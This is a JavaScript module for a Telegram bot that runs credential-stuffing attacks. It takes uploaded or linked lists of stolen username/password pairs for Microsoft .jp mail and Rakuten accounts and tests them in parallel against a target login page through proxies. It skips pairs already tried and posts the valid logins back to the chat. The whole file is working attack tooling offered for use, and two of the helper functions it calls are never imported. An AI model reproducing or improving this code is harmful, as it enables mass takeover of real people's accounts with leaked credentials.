const { Markup } = require('telegraf');
const {
  prepareBatchFromFile,
  prepareUlpBatch,
  ALLOWED_DOMAINS,
  MAX_BYTES_HOTMAIL,
  MAX_BYTES_ULP,
} = require('../automation/batchProcessor');
const {
  DEFAULT_TTL_MS,
  initProcessedStore,
  getProcessedStatus,
  markProcessedStatus,
  isSkippableStatus,
  makeKey,
} = require('../automation/batch/processedStore');
const {
  escapeV2,
  formatBytes,
  formatDurationMs,
  buildFileTooLarge,
  buildFileReceived,
  buildUnableToLink,
  buildUlpProcessing,
  buildUlpParsed,
  buildHotmailParsed,
  buildNoEligible,
  buildAllProcessed,
  buildBatchParseFailed,
  buildBatchConfirmStart,
  buildBatchProgress,
  buildBatchSummary,
  buildBatchAborted,
  buildBatchCancelled,
  buildBatchAborting,
  buildNoActiveBatch,
  buildBatchFailed,
  buildProcessingHotmail,
  codeSpan,
} = require('./messages');
const { createLogger } = require('../logger');

const log = createLogger('batch');

const BATCH_CONCURRENCY = 3;
const TELEGRAM_FILE_LIMIT_BYTES = 20 * 1024 * 1024; // Telegram bot API download limit (~20MB)
const pendingBatches = new Map();
const pendingFiles = new Map();
const PROCESSED_TTL_MS = parseInt(process.env.PROCESSED_TTL_MS, 10) || DEFAULT_TTL_MS;

async function filterAlreadyProcessed(creds) {
  await initProcessedStore(PROCESSED_TTL_MS);
  const filtered = [];
  let skipped = 0;

  for (const cred of creds) {
    const key = makeKey(cred.username, cred.password);
    const status = getProcessedStatus(key, PROCESSED_TTL_MS);
    if (status && isSkippableStatus(status)) {
      skipped += 1;
      continue;
    }
    filtered.push({ ...cred, _dedupeKey: key });
  }

  return { filtered, skipped };
}

function runBatchExecution(ctx, batch, msgId, statusMsg, options, helpers, key, checkCredentials) {
  const { escapeV2, formatDurationMs } = helpers;
  const chatId = ctx.chat.id;
  const counts = { VALID: 0, INVALID: 0, BLOCKED: 0, ERROR: 0 };
  let processed = 0;
  const validCreds = [];
  const startedAt = Date.now();
  let lastProgressAt = startedAt;

  log.info(`[batch] executing file=${batch.filename} total=${batch.count}`);

  const iterator = batch.creds[Symbol.iterator]();

  const processCredential = async (cred) => {
    if (batch.aborted) return;
    let result;
    const credKey = cred._dedupeKey || makeKey(cred.username, cred.password);
    try {
      result = await checkCredentials(cred.username, cred.password, {
        timeoutMs: options.timeoutMs || 60000,
        proxy: options.proxy,
        screenshotOn: false,
        targetUrl: options.targetUrl || process.env.TARGET_LOGIN_URL,
        headless: options.headless,
      });
    } catch (err) {
      result = { status: 'ERROR', message: err.message };
    }

    counts[result.status] = (counts[result.status] || 0) + 1;
    processed += 1;

    if (result.status === 'VALID') {
      validCreds.push({ username: cred.username, password: cred.password });
    }

    markProcessedStatus(credKey, result.status, PROCESSED_TTL_MS).catch((err) => {
      log.warn(`Unable to record processed status: ${err.message}`);
    });

    if (batch.aborted) return;

    const now = Date.now();
    const shouldUpdate =
      processed === 1 ||
      processed === batch.count ||
      processed % 5 === 0 ||
      now - lastProgressAt >= 5000;

    if (shouldUpdate) {
      const text = buildBatchProgress({
        filename: batch.filename,
        processed,
        total: batch.count,
        counts,
      });

      try {
        await ctx.telegram.editMessageText(chatId, statusMsg.message_id, undefined, text, {
          parse_mode: 'MarkdownV2',
        });
      } catch (_) {
        log.warn('Batch progress edit failed');
      }

      lastProgressAt = now;
    }
  };

  const worker = async () => {
    for (;;) {
      if (batch.aborted) return;
      const next = iterator.next();
      if (next.done) return;
      await processCredential(next.value);
    }
  };

  const execute = async () => {
    try {
      const poolSize = Math.min(BATCH_CONCURRENCY, batch.creds.length);
      await Promise.all(Array.from({ length: poolSize }, () => worker()));

      const elapsed = Date.now() - startedAt;
      const summary = batch.aborted
        ? buildBatchAborted({ filename: batch.filename, total: batch.count, processed })
        : buildBatchSummary({
            filename: batch.filename,
            total: batch.count,
            skipped: batch.skipped || 0,
            counts,
            elapsedMs: elapsed,
            validCreds,
          });

      try {
        await ctx.telegram.editMessageText(chatId, statusMsg.message_id, undefined, summary, {
          parse_mode: 'MarkdownV2',
        });
      } catch (err) {
        log.warn('Batch summary edit failed:', err.message);
        await ctx.reply(summary, {
          parse_mode: 'MarkdownV2',
          reply_to_message_id: Number(msgId),
        });
      }

      log.info(
        `[batch] finished file=${batch.filename} aborted=${!!batch.aborted} processed=${processed}/${batch.count} ` +
          `valid=${counts.VALID} invalid=${counts.INVALID} blocked=${counts.BLOCKED} error=${counts.ERROR} elapsed_ms=${elapsed}`
      );
    } catch (err) {
      try {
        await ctx.reply(buildBatchFailed(err.message), {
          parse_mode: 'MarkdownV2',
          reply_to_message_id: Number(msgId),
        });
      } catch (_) {
        // swallow
      }
      log.warn('Batch execution error:', err.message);
      log.warn(`[batch] execution failed file=${batch.filename} msg=${err.message}`);
    } finally {
      pendingBatches.delete(key);
    }
  };

  // Schedule to avoid Telegraf 90s per-update timeout
  setTimeout(execute, 0);
}

function registerBatchHandlers(bot, options, helpers) {
  const checkCredentials = options.checkCredentials;

  if (typeof checkCredentials !== 'function') {
    throw new Error('registerBatchHandlers requires options.checkCredentials');
  }

  bot.on('document', async (ctx) => {
    const doc = ctx.message && ctx.message.document;
    if (!doc) return;

    const chatId = ctx.chat.id;
    const sourceMessageId = ctx.message && ctx.message.message_id;

    log.info(`[batch] file received name=${doc.file_name || 'unknown'} size=${doc.file_size || 0}`);

    if (doc.file_size && doc.file_size > TELEGRAM_FILE_LIMIT_BYTES) {
      await ctx.reply(buildFileTooLarge(), {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: sourceMessageId,
      });
      return;
    }

    let fileUrl;
    try {
      const link = await ctx.telegram.getFileLink(doc.file_id);
      fileUrl = link.href || link.toString();
    } catch (err) {
      await ctx.reply(buildUnableToLink(err.message), {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: doc.message_id,
      });
      return;
    }

    const key = `${chatId}:${sourceMessageId}`;
    pendingFiles.set(key, {
      fileUrl,
      filename: doc.file_name || 'file.txt',
      size: doc.file_size,
      sourceMessageId,
    });

    await ctx.reply(buildFileReceived({ filename: doc.file_name || 'file', size: doc.file_size }), {
      parse_mode: 'MarkdownV2',
      reply_to_message_id: sourceMessageId,
      ...Markup.inlineKeyboard([
        [
          Markup.button.callback('📧 HOTMAIL (.jp)', `batch_type_hotmail_${sourceMessageId}`),
          Markup.button.callback('📄 ULP (Rakuten)', `batch_type_ulp_${sourceMessageId}`),
        ],
        [Markup.button.callback('⛔ Cancel', `batch_cancel_${sourceMessageId}`)],
      ]),
    });
  });

  bot.hears(/^\.ulp\s+(https?:\/\/\S+)/i, async (ctx) => {
    const chatId = ctx.chat.id;
    const sourceMessageId = ctx.message && ctx.message.message_id;
    const url = ctx.match[1];

    log.info(`[batch][ulp] start url=${url}`);

    if (!url || url.length > 1000) {
      await ctx.reply(escapeV2('⚠️ Provide a valid URL after `.ulp`.'), {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: sourceMessageId,
      });
      return;
    }

    try {
      await ctx.reply(buildUlpProcessing(), {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: sourceMessageId,
      });
    } catch (_) {}

    let batch;
    try {
      batch = await prepareUlpBatch(url, MAX_BYTES_ULP);
      log.info(`[batch][ulp] parsed count=${batch.count}`);
    } catch (err) {
      await ctx.reply(buildBatchParseFailed(err.message), {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: sourceMessageId,
      });
      log.warn(`[batch][ulp] parse failed url=${url} msg=${err.message}`);
      return;
    }

    if (!batch.count) {
      await ctx.reply(buildNoEligible('Rakuten'), {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: sourceMessageId,
      });
      return;
    }

    const { filtered, skipped } = await filterAlreadyProcessed(batch.creds);
    if (!filtered.length) {
      await ctx.reply(buildAllProcessed('from this URL'), {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: sourceMessageId,
      });
      return;
    }

    batch.creds = filtered;
    batch.count = filtered.length;
    batch.skipped = skipped;

    const key = `${chatId}:${sourceMessageId}`;
    pendingBatches.set(key, {
      creds: batch.creds,
      filename: url,
      count: batch.count,
      skipped: batch.skipped,
      sourceMessageId: Number(sourceMessageId),
    });

    await ctx.reply(buildUlpParsed({ url, count: batch.count }), {
      parse_mode: 'MarkdownV2',
      reply_to_message_id: sourceMessageId,
      ...Markup.inlineKeyboard([
        [
          Markup.button.callback('✅ Proceed', `batch_confirm_${sourceMessageId}`),
          Markup.button.callback('⛔ Cancel', `batch_cancel_${sourceMessageId}`),
        ],
      ]),
    });
  });

  bot.action(/batch_confirm_(.+)/, async (ctx) => {
    try {
      await ctx.answerCbQuery();
      const msgId = ctx.match[1];
      const key = `${ctx.chat.id}:${msgId}`;
      const batch = pendingBatches.get(key);
      if (!batch) {
        await ctx.reply(buildBatchFailed('Batch expired. Send the file again to restart.'), {
          parse_mode: 'MarkdownV2',
          reply_to_message_id: Number(msgId),
        });
        return;
      }

      const statusText = buildBatchConfirmStart({
        filename: batch.filename,
        count: batch.count,
        skipped: batch.skipped,
      });

      const statusMsg = await ctx.reply(statusText, {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: Number(msgId),
        ...Markup.inlineKeyboard([[Markup.button.callback('⏹ Abort', `batch_abort_${msgId}`)]]),
      });

      log.info(`[batch] starting file=${batch.filename} count=${batch.count}`);

      runBatchExecution(ctx, batch, msgId, statusMsg, options, helpers, key, checkCredentials);
    } catch (err) {
      log.warn('Batch confirm handler error:', err.message);
      await ctx.reply(buildBatchFailed(err.message), {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: ctx.update?.callback_query?.message?.message_id,
      });
    }
  });

  bot.action(/batch_cancel_(.+)/, async (ctx) => {
    await ctx.answerCbQuery('Batch cancelled');
    const msgId = ctx.match[1];
    const key = `${ctx.chat.id}:${msgId}`;
    pendingBatches.delete(key);
    pendingFiles.delete(key);
    try {
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        ctx.update.callback_query.message.message_id,
        undefined,
        buildBatchCancelled(),
        { parse_mode: 'MarkdownV2' }
      );
    } catch (_) {
      await ctx.reply(buildBatchCancelled(), {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: Number(msgId),
      });
    }
  });

  bot.action(/batch_type_hotmail_(.+)/, async (ctx) => {
    await ctx.answerCbQuery();
    const msgId = ctx.match[1];
    const key = `${ctx.chat.id}:${msgId}`;
    const file = pendingFiles.get(key);
    if (!file) {
      await ctx.reply(buildBatchFailed('File info expired. Send the file again.'), {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: Number(msgId),
      });
      return;
    }

    try {
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        ctx.update.callback_query.message.message_id,
        undefined,
        buildProcessingHotmail(),
        { parse_mode: 'MarkdownV2' }
      );
    } catch (_) {}

    let batch;
    try {
      batch = await prepareBatchFromFile(file.fileUrl, MAX_BYTES_HOTMAIL);
      log.info(`[batch][hotmail] parsed count=${batch.count} file=${file.filename}`);
    } catch (err) {
      await ctx.reply(buildBatchParseFailed(err.message), {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: Number(msgId),
      });
      log.warn(`[batch][hotmail] parse failed file=${file.filename} msg=${err.message}`);
      return;
    }

    if (!batch.count) {
      await ctx.reply(buildNoEligible('Microsoft .jp'), {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: Number(msgId),
      });
      return;
    }

    const { filtered, skipped } = await filterAlreadyProcessed(batch.creds);
    if (!filtered.length) {
      await ctx.reply(buildAllProcessed('in this file'), {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: Number(msgId),
      });
      return;
    }

    batch.creds = filtered;
    batch.count = filtered.length;
    batch.skipped = skipped;

    pendingFiles.delete(key);
    pendingBatches.set(key, {
      creds: batch.creds,
      filename: file.filename,
      count: batch.count,
      skipped: batch.skipped,
      sourceMessageId: Number(msgId),
    });

    await ctx.reply(
      buildHotmailParsed({ filename: file.filename, size: file.size, count: batch.count, allowedDomains: ALLOWED_DOMAINS }),
      {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: Number(msgId),
        ...Markup.inlineKeyboard([
          [
            Markup.button.callback('✅ Proceed', `batch_confirm_${msgId}`),
            Markup.button.callback('⛔ Cancel', `batch_cancel_${msgId}`),
          ],
        ]),
      }
    );
  });

  bot.action(/batch_type_ulp_(.+)/, async (ctx) => {
    await ctx.answerCbQuery();
    const msgId = ctx.match[1];
    const key = `${ctx.chat.id}:${msgId}`;
    const file = pendingFiles.get(key);
    if (!file) {
      await ctx.reply(buildBatchFailed('File info expired. Send the file again.'), {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: Number(msgId),
      });
      return;
    }

    try {
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        ctx.update.callback_query.message.message_id,
        undefined,
        buildProcessingUlp(),
        { parse_mode: 'MarkdownV2' }
      );
    } catch (_) {}

    let batch;
    try {
      batch = await prepareUlpBatch(file.fileUrl, MAX_BYTES_ULP);
      log.info(`[batch][ulp-file] parsed count=${batch.count} file=${file.filename}`);
    } catch (err) {
      await ctx.reply(buildBatchParseFailed(err.message), {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: Number(msgId),
      });
      log.warn(`[batch][ulp-file] parse failed file=${file.filename} msg=${err.message}`);
      return;
    }

    if (!batch.count) {
      await ctx.reply(buildNoEligible('Rakuten'), {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: Number(msgId),
      });
      return;
    }

    const { filtered, skipped } = await filterAlreadyProcessed(batch.creds);
    if (!filtered.length) {
      await ctx.reply(buildAllProcessed('in this file'), {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: Number(msgId),
      });
      return;
    }

    batch.creds = filtered;
    batch.count = filtered.length;
    batch.skipped = skipped;

    pendingFiles.delete(key);
    pendingBatches.set(key, {
      creds: batch.creds,
      filename: file.filename,
      count: batch.count,
      skipped: batch.skipped,
      sourceMessageId: Number(msgId),
    });

    await ctx.reply(
      buildUlpFileParsed({ filename: file.filename, size: file.size, count: batch.count }),
      {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: Number(msgId),
        ...Markup.inlineKeyboard([
          [
            Markup.button.callback('✅ Proceed', `batch_confirm_${msgId}`),
            Markup.button.callback('⛔ Cancel', `batch_cancel_${msgId}`),
          ],
        ]),
      }
    );
  });

  bot.action(/batch_abort_(.+)/, async (ctx) => {
    await ctx.answerCbQuery('Aborting...');
    const msgId = ctx.match[1];
    const key = `${ctx.chat.id}:${msgId}`;
    const batch = pendingBatches.get(key);
    if (batch) {
      batch.aborted = true;
      log.info(`[batch] abort requested file=${batch.filename}`);
      try {
        await ctx.telegram.editMessageText(
          ctx.chat.id,
          ctx.update.callback_query.message.message_id,
          undefined,
          buildBatchAborting(),
          {
            parse_mode: 'MarkdownV2',
            ...Markup.inlineKeyboard([]),
          }
        );
      } catch (_) {}
    } else {
      await ctx.reply(buildNoActiveBatch(), {
        parse_mode: 'MarkdownV2',
        reply_to_message_id: ctx.update.callback_query.message.message_id,
      });
    }
  });
}

module.exports = {
  registerBatchHandlers,
};
